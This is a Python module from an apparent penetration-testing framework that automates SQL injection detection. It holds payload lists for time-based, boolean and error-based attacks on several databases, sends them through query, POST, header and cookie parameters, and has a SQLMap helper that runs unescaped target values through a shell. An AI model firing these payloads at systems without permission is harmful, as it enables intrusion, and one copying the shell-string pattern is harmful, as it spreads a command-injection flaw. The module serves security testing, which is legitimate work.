"""SQL Injection module for automated testing with multiple techniques

This module implements:
- Time-based blind SQL injection with adaptive delays
- Boolean-based SQL injection with true/false testing
- Error-based SQL injection with database detection
- SQLMap integration for advanced exploitation
"""

import asyncio
import re
import statistics
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine
from src.vulnchain.models.target import TargetConfig


class SQLInjectionType(Enum):
    """Types of SQL injection techniques"""
    
    TIME_BASED_BLIND = "time_based_blind"
    BOOLEAN_BASED = "boolean_based"
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"


class DatabaseType(Enum):
    """Detected database types"""
    
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


@dataclass
class InjectionPoint:
    """Represents a potential SQL injection point"""
    
    parameter: str
    location: str  # query, post, header, cookie
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None


@dataclass
class SQLInjectionResult:
    """Result of SQL injection testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    injection_type: Optional[SQLInjectionType] = None
    database_type: Optional[DatabaseType] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    response_time: Optional[float] = None
    error_message: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


@dataclass
class BaselineMeasurement:
    """Baseline response time measurements"""
    
    mean: float
    median: float
    std_dev: float
    samples: List[float]
    threshold: float  # Calculated threshold for time-based detection


class SQLInjectionTester:
    """SQL Injection testing with multiple techniques"""
    
    # Database error patterns for detection
    DB_ERROR_PATTERNS = {
        DatabaseType.MYSQL: [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
        ],
        DatabaseType.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
        ],
        DatabaseType.MSSQL: [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"Microsoft SQL.*Native Client",
            r"SQL Server Native Client",
        ],
        DatabaseType.ORACLE: [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
        ],
        DatabaseType.SQLITE: [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"SQLite3::SQLException",
        ],
    }
    
    def __init__(
        self,
        request_handler: RequestHandler,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize SQL injection tester
        
        Args:
            request_handler: Request handler for HTTP communication
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default SQL injection payloads"""
        # Time-based blind payloads
        time_based_payloads = [
            # MySQL
            "' AND SLEEP(5)--",
            "' AND SLEEP(5)#",
            "1' AND SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "' OR SLEEP(5)--",
            "' OR SLEEP(5)#",
            "1 AND SLEEP(5)",
            "1 OR SLEEP(5)",
            # PostgreSQL
            "'; SELECT pg_sleep(5)--",
            "1'; SELECT pg_sleep(5)--",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
            # MSSQL
            "'; WAITFOR DELAY '0:0:5'--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' WAITFOR DELAY '0:0:5'--",
            # Oracle
            "' AND DBMS_LOCK.SLEEP(5)--",
            "1' AND DBMS_LOCK.SLEEP(5)--",
            # SQLite
            "' AND (SELECT 1 FROM (SELECT RANDOMBLOB(100000000)))--",
        ]
        
        # Boolean-based payloads
        boolean_payloads = [
            # True conditions
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "admin' OR '1'='1",
            "admin' OR 1=1--",
            # False conditions
            "' AND '1'='2",
            "' AND 1=2--",
            "' AND 1=2#",
            "1' AND '1'='2",
            "1' AND 1=2--",
            "1' AND 1=2#",
        ]
        
        # Error-based payloads
        error_payloads = [
            "'",
            "''",
            "\"",
            "\"\"",
            "')",
            "'))",
            "'\"",
            "';",
            "' OR '1",
            "' OR 1--",
            "' OR 1#",
            "1'",
            "1' AND '1'='1",
            "1' AND 1=1--",
            # Type confusion
            "1' AND 'a'='a",
            "1' AND 1='1",
            # Subquery errors
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--",
        ]
        
        # Add payloads to engine
        for payload in time_based_payloads:
            self.payload_engine.add_custom_payload(payload, "sqli_time_based")
        
        for payload in boolean_payloads:
            self.payload_engine.add_custom_payload(payload, "sqli_boolean")
        
        for payload in error_payloads:
            self.payload_engine.add_custom_payload(payload, "sqli_error")
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[SQLInjectionType]] = None,
    ) -> List[SQLInjectionResult]:
        """Test an injection point with specified techniques
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of SQL injection results
        """
        if techniques is None:
            techniques = list(SQLInjectionType)
        
        results = []
        
        # Test each technique
        for technique in techniques:
            if technique == SQLInjectionType.ERROR_BASED:
                result = await self._test_error_based(injection_point)
            elif technique == SQLInjectionType.BOOLEAN_BASED:
                result = await self._test_boolean_based(injection_point)
            elif technique == SQLInjectionType.TIME_BASED_BLIND:
                result = await self._test_time_based(injection_point)
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _test_error_based(
        self, injection_point: InjectionPoint
    ) -> Optional[SQLInjectionResult]:
        """Test for error-based SQL injection
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SQLInjectionResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text.lower()
        
        # Test error-based payloads
        for payload_obj in self.payload_engine.get_payloads("sqli_error"):
            payload = payload_obj.encoded
            
            # Send request with payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text.lower()
            
            # Check for database errors
            db_type, error_message = self._detect_database_error(response_text)
            
            if db_type != DatabaseType.UNKNOWN:
                # Found a database error - likely vulnerable
                return SQLInjectionResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    injection_type=SQLInjectionType.ERROR_BASED,
                    database_type=db_type,
                    payload=payload,
                    confidence=0.9,
                    error_message=error_message,
                    evidence=[
                        f"Database error detected: {error_message}",
                        f"Payload: {payload}",
                        f"Database type: {db_type.value}",
                    ],
                )
        
        # No vulnerability found
        return SQLInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            injection_type=SQLInjectionType.ERROR_BASED,
            confidence=0.0,
        )
    
    async def _test_boolean_based(
        self, injection_point: InjectionPoint
    ) -> Optional[SQLInjectionResult]:
        """Test for boolean-based SQL injection
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SQLInjectionResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_length = len(baseline_response.text)
        baseline_status = baseline_response.status_code
        
        # Test boolean payloads in pairs (true/false)
        boolean_payloads = list(self.payload_engine.get_payloads("sqli_boolean"))
        
        # Group payloads into true/false pairs
        true_payloads = [p for p in boolean_payloads if "OR" in p.encoded or "='1" in p.encoded]
        false_payloads = [p for p in boolean_payloads if "AND" in p.encoded or "='2" in p.encoded]
        
        for true_payload_obj in true_payloads[:5]:  # Test first 5 pairs
            true_payload = true_payload_obj.encoded
            
            # Send true condition
            true_response = await self._send_request(injection_point, true_payload)
            true_length = len(true_response.text)
            true_status = true_response.status_code
            
            # Find corresponding false payload
            false_payload = true_payload.replace("OR", "AND").replace("='1", "='2").replace("=1", "=2")
            
            # Send false condition
            false_response = await self._send_request(injection_point, false_payload)
            false_length = len(false_response.text)
            false_status = false_response.status_code
            
            # Check if responses differ significantly
            length_diff = abs(true_length - false_length)
            status_diff = true_status != false_status
            
            # If true condition gives different response than false condition
            if length_diff > 100 or status_diff:
                # Verify with another test
                verify_response = await self._send_request(injection_point, true_payload)
                verify_length = len(verify_response.text)
                
                # Check consistency
                if abs(verify_length - true_length) < 50:
                    return SQLInjectionResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        injection_type=SQLInjectionType.BOOLEAN_BASED,
                        payload=true_payload,
                        confidence=0.85,
                        evidence=[
                            f"True condition payload: {true_payload}",
                            f"True response length: {true_length}",
                            f"False condition payload: {false_payload}",
                            f"False response length: {false_length}",
                            f"Length difference: {length_diff}",
                            f"Status difference: {status_diff}",
                        ],
                        metadata={
                            "true_length": true_length,
                            "false_length": false_length,
                            "baseline_length": baseline_length,
                        },
                    )
        
        # No vulnerability found
        return SQLInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            injection_type=SQLInjectionType.BOOLEAN_BASED,
            confidence=0.0,
        )
    
    async def _test_time_based(
        self, injection_point: InjectionPoint
    ) -> Optional[SQLInjectionResult]:
        """Test for time-based blind SQL injection with adaptive delays
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SQLInjectionResult if vulnerability found, None otherwise
        """
        # Measure baseline response times
        baseline = await self._measure_baseline(injection_point)
        
        # Test time-based payloads
        for payload_obj in self.payload_engine.get_payloads("sqli_time_based"):
            payload = payload_obj.encoded
            
            # Extract expected delay from payload
            expected_delay = self._extract_delay_from_payload(payload)
            
            # Send request with time-based payload
            start_time = time.time()
            response = await self._send_request(injection_point, payload)
            elapsed_time = time.time() - start_time
            
            # Check if response time indicates injection
            if elapsed_time >= (baseline.threshold + expected_delay * 0.8):
                # Verify with another test
                start_time = time.time()
                verify_response = await self._send_request(injection_point, payload)
                verify_elapsed = time.time() - start_time
                
                # Check consistency
                if verify_elapsed >= (baseline.threshold + expected_delay * 0.8):
                    # Detect database type from payload
                    db_type = self._detect_database_from_payload(payload)
                    
                    return SQLInjectionResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        injection_type=SQLInjectionType.TIME_BASED_BLIND,
                        database_type=db_type,
                        payload=payload,
                        confidence=0.95,
                        response_time=elapsed_time,
                        evidence=[
                            f"Payload: {payload}",
                            f"Expected delay: {expected_delay}s",
                            f"Actual delay: {elapsed_time:.2f}s",
                            f"Baseline: {baseline.mean:.2f}s (threshold: {baseline.threshold:.2f}s)",
                            f"Verification delay: {verify_elapsed:.2f}s",
                        ],
                        metadata={
                            "baseline_mean": baseline.mean,
                            "baseline_threshold": baseline.threshold,
                            "expected_delay": expected_delay,
                            "actual_delay": elapsed_time,
                            "verification_delay": verify_elapsed,
                        },
                    )
        
        # No vulnerability found
        return SQLInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            injection_type=SQLInjectionType.TIME_BASED_BLIND,
            confidence=0.0,
        )
    
    async def _measure_baseline(
        self, injection_point: InjectionPoint, samples: int = 5
    ) -> BaselineMeasurement:
        """Measure baseline response times for adaptive delay detection
        
        Args:
            injection_point: The injection point to measure
            samples: Number of samples to collect
        
        Returns:
            BaselineMeasurement with statistics
        """
        response_times = []
        
        for _ in range(samples):
            start_time = time.time()
            await self._send_request(injection_point, injection_point.original_value)
            elapsed = time.time() - start_time
            response_times.append(elapsed)
            
            # Small delay between samples
            await asyncio.sleep(0.1)
        
        mean = statistics.mean(response_times)
        median = statistics.median(response_times)
        std_dev = statistics.stdev(response_times) if len(response_times) > 1 else 0.0
        
        # Calculate threshold: mean + 3 * std_dev (99.7% confidence)
        threshold = mean + (3 * std_dev)
        
        return BaselineMeasurement(
            mean=mean,
            median=median,
            std_dev=std_dev,
            samples=response_times,
            threshold=threshold,
        )
    
    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value
        
        Args:
            injection_point: The injection point
            value: The value to inject
        
        Returns:
            Response object
        """
        if injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )
        
        elif injection_point.location == "post":
            # Inject into POST data
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )
        
        elif injection_point.location == "header":
            # Inject into header
            headers = injection_point.headers.copy()
            headers[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=injection_point.data,
            )
        
        elif injection_point.location == "cookie":
            # Inject into cookie
            cookies = {injection_point.parameter: value}
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                cookies=cookies,
                data=injection_point.data,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")
    
    def _detect_database_error(self, response_text: str) -> Tuple[DatabaseType, Optional[str]]:
        """Detect database type from error message
        
        Args:
            response_text: Response text to analyze
        
        Returns:
            Tuple of (DatabaseType, error_message)
        """
        for db_type, patterns in self.DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        
        return DatabaseType.UNKNOWN, None
    
    def _extract_delay_from_payload(self, payload: str) -> float:
        """Extract expected delay from time-based payload
        
        Args:
            payload: The payload string
        
        Returns:
            Expected delay in seconds
        """
        # Look for SLEEP(n), pg_sleep(n), WAITFOR DELAY, etc.
        patterns = [
            r"SLEEP\((\d+)\)",
            r"pg_sleep\((\d+)\)",
            r"WAITFOR DELAY '0:0:(\d+)'",
            r"DBMS_LOCK\.SLEEP\((\d+)\)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, payload, re.IGNORECASE)
            if match:
                return float(match.group(1))
        
        # Default to 5 seconds if not found
        return 5.0
    
    def _detect_database_from_payload(self, payload: str) -> DatabaseType:
        """Detect database type from payload syntax
        
        Args:
            payload: The payload string
        
        Returns:
            Detected database type
        """
        payload_lower = payload.lower()
        
        # Check in order of specificity (most specific first)
        if "dbms_lock.sleep" in payload_lower or "dbms_lock" in payload_lower:
            return DatabaseType.ORACLE
        elif "pg_sleep" in payload_lower:
            return DatabaseType.POSTGRESQL
        elif "waitfor delay" in payload_lower:
            return DatabaseType.MSSQL
        elif "randomblob" in payload_lower:
            return DatabaseType.SQLITE
        elif "sleep(" in payload_lower:
            return DatabaseType.MYSQL
        
        return DatabaseType.UNKNOWN


class SQLMapIntegration:
    """Integration with SQLMap for advanced exploitation"""
    
    def __init__(self, sqlmap_path: str = "sqlmap"):
        """Initialize SQLMap integration
        
        Args:
            sqlmap_path: Path to sqlmap executable
        """
        self.sqlmap_path = sqlmap_path
    
    def export_to_sqlmap_format(
        self,
        injection_point: InjectionPoint,
        result: SQLInjectionResult,
    ) -> Dict:
        """Export vulnerable request to SQLMap format
        
        Args:
            injection_point: The injection point
            result: The SQL injection result
        
        Returns:
            Dictionary with SQLMap request format
        """
        sqlmap_request = {
            "url": injection_point.url,
            "method": injection_point.method,
            "headers": injection_point.headers,
            "data": injection_point.data,
            "vulnerable_parameter": injection_point.parameter,
            "injection_type": result.injection_type.value if result.injection_type else None,
            "database_type": result.database_type.value if result.database_type else None,
            "payload": result.payload,
        }
        
        return sqlmap_request
    
    def generate_sqlmap_command(
        self,
        injection_point: InjectionPoint,
        result: SQLInjectionResult,
        options: Optional[Dict] = None,
    ) -> str:
        """Generate SQLMap command line
        
        Args:
            injection_point: The injection point
            result: The SQL injection result
            options: Additional SQLMap options
        
        Returns:
            SQLMap command string
        """
        options = options or {}
        
        cmd_parts = [self.sqlmap_path]
        
        # Add URL
        cmd_parts.append(f"-u '{injection_point.url}'")
        
        # Add method if POST
        if injection_point.method.upper() == "POST":
            if injection_point.data:
                data_str = "&".join(f"{k}={v}" for k, v in injection_point.data.items())
                cmd_parts.append(f"--data='{data_str}'")
        
        # Add headers
        if injection_point.headers:
            for key, value in injection_point.headers.items():
                cmd_parts.append(f"--header='{key}: {value}'")
        
        # Add vulnerable parameter
        cmd_parts.append(f"-p '{injection_point.parameter}'")
        
        # Add technique based on result
        if result.injection_type == SQLInjectionType.TIME_BASED_BLIND:
            cmd_parts.append("--technique=T")
        elif result.injection_type == SQLInjectionType.BOOLEAN_BASED:
            cmd_parts.append("--technique=B")
        elif result.injection_type == SQLInjectionType.ERROR_BASED:
            cmd_parts.append("--technique=E")
        
        # Add database type if known
        if result.database_type and result.database_type != DatabaseType.UNKNOWN:
            cmd_parts.append(f"--dbms={result.database_type.value}")
        
        # Add additional options
        for key, value in options.items():
            if value is True:
                cmd_parts.append(f"--{key}")
            elif value is not False and value is not None:
                cmd_parts.append(f"--{key}={value}")
        
        return " ".join(cmd_parts)
    
    async def execute_sqlmap(
        self,
        command: str,
        timeout: int = 300,
    ) -> Tuple[int, str, str]:
        """Execute SQLMap command
        
        Args:
            command: SQLMap command to execute
            timeout: Timeout in seconds
        
        Returns:
            Tuple of (return_code, stdout, stderr)
        """
        import subprocess
        
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout,
            )
            
            return (
                process.returncode,
                stdout.decode("utf-8", errors="ignore"),
                stderr.decode("utf-8", errors="ignore"),
            )
        
        except asyncio.TimeoutError:
            process.kill()
            return (-1, "", "SQLMap execution timed out")
        except Exception as e:
            return (-1, "", f"SQLMap execution failed: {str(e)}")
